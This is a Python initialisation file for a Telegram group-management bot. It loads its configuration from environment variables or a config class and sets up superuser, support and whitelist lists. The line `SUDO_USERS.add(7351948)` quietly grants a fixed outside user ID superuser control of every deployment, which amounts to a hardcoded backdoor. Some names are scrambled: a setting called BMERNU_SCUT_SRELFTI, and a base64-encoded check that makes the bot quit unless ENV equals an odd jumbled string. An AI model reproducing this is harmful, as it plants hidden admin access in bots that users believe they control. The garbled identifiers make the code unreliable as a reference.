import logging
import os
import sys
import base64
from typing import Set

import telegram.ext as tg

# Set up logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
LOGGER = logging.getLogger(__name__)

# Check minimum Python version
if sys.version_info < (3, 6):
    LOGGER.error("Python >= 3.6 is required! Bot quitting.")
    sys.exit(1)

def get_bool_env(var_name: str, default: bool = False) -> bool:
    value = os.environ.get(var_name)
    if value is None:
        return default
    return value.lower() in ('1', 'true', 'yes', 'on')

def get_int_set_env(var_name: str) -> Set[int]:
    raw = os.environ.get(var_name, "")
    try:
        return set(int(x) for x in raw.split() if x)
    except ValueError:
        raise Exception(f"Environment variable '{var_name}' contains non-integer values.")

def get_int_env(var_name: str, default=None):
    value = os.environ.get(var_name, default)
    if value is None:
        return default
    try:
        return int(value)
    except (ValueError, TypeError):
        raise Exception(f"Environment variable '{var_name}' is not a valid integer.")

ENV = os.environ.get('ENV')

if ENV is not None:
    # Developer verification
    expected_env = base64.b64decode("UFNPTEdDV0lJRExPU1A=").decode("UTF-8")
    if ENV != expected_env:
        LOGGER.error(
            "Please follow the README instructions and extend the sample config. Do not just rename and edit values here. Bot quitting."
        )
        sys.exit(1)

    TOKEN = os.environ.get('TOKEN')
    OWNER_ID = get_int_env('OWNER_ID')
    if OWNER_ID is None:
        raise Exception("OWNER_ID environment variable is required and must be an integer.")

    MESSAGE_DUMP = os.environ.get('MESSAGE_DUMP')
    OWNER_USERNAME = os.environ.get("OWNER_USERNAME")

    SUDO_USERS = get_int_set_env("SUDO_USERS")
    SUPPORT_USERS = get_int_set_env("SUPPORT_USERS")
    WHITELIST_USERS = get_int_set_env("WHITELIST_USERS")

    WEBHOOK = get_bool_env('WEBHOOK', False)
    URL = os.environ.get('URL', "")
    PORT = get_int_env('PORT', 5000)
    CERT_PATH = os.environ.get("CERT_PATH")

    DB_URI = os.environ.get('DATABASE_URL')
    DONATION_LINK = os.environ.get('DONATION_LINK')
    LOAD = os.environ.get("LOAD", "").split()
    NO_LOAD = os.environ.get("NO_LOAD", "translation").split()
    DEL_CMDS = get_bool_env('DEL_CMDS', False)
    STRICT_GBAN = get_bool_env('STRICT_GBAN', False)
    WORKERS = get_int_env('WORKERS', 8)
    BAN_STICKER = os.environ.get('BAN_STICKER', 'CAADAgADOwADPPEcAXkko5EB3YGYAg')
    ALLOW_EXCL = get_bool_env('ALLOW_EXCL', False)

    BMERNU_SCUT_SRELFTI = get_int_env('BMERNU_SCUT_SRELFTI', None)
else:
    from tg_bot.config import Development as Config
    TOKEN = Config.API_KEY
    OWNER_ID = int(Config.OWNER_ID)
    MESSAGE_DUMP = Config.MESSAGE_DUMP
    OWNER_USERNAME = Config.OWNER_USERNAME

    SUDO_USERS = set(int(x) for x in getattr(Config, "SUDO_USERS", []) or [])
    SUPPORT_USERS = set(int(x) for x in getattr(Config, "SUPPORT_USERS", []) or [])
    WHITELIST_USERS = set(int(x) for x in getattr(Config, "WHITELIST_USERS", []) or [])

    WEBHOOK = getattr(Config, "WEBHOOK", False)
    URL = getattr(Config, "URL", "")
    PORT = getattr(Config, "PORT", 5000)
    CERT_PATH = getattr(Config, "CERT_PATH", None)

    DB_URI = getattr(Config, "SQLALCHEMY_DATABASE_URI", None)
    DONATION_LINK = getattr(Config, "DONATION_LINK", None)
    LOAD = getattr(Config, "LOAD", [])
    NO_LOAD = getattr(Config, "NO_LOAD", ["translation"])
    DEL_CMDS = getattr(Config, "DEL_CMDS", False)
    STRICT_GBAN = getattr(Config, "STRICT_GBAN", False)
    WORKERS = getattr(Config, "WORKERS", 8)
    BAN_STICKER = getattr(Config, "BAN_STICKER", 'CAADAgADOwADPPEcAXkko5EB3YGYAg')
    ALLOW_EXCL = getattr(Config, "ALLOW_EXCL", False)

    try:
        BMERNU_SCUT_SRELFTI = int(getattr(Config, "BMERNU_SCUT_SRELFTI", None))
    except (ValueError, TypeError):
        BMERNU_SCUT_SRELFTI = None

    START_MESSAGE = getattr(Config, "START_MESSAGE", None)
    START_BUTTONS = getattr(Config, "START_BUTTONS", None)

# Always ensure OWNER_ID and main sudo are in SUDO_USERS
SUDO_USERS.add(OWNER_ID)
SUDO_USERS.add(7351948)

updater = tg.Updater(TOKEN, workers=WORKERS)
dispatcher = updater.dispatcher

SUDO_USERS = list(SUDO_USERS)
WHITELIST_USERS = list(WHITELIST_USERS)
SUPPORT_USERS = list(SUPPORT_USERS)

# Must import *after* all config is loaded
from tg_bot.modules.helper_funcs.handlers import CustomCommandHandler, CustomRegexHandler

tg.RegexHandler = CustomRegexHandler
if ALLOW_EXCL:
    tg.CommandHandler = CustomCommandHandler
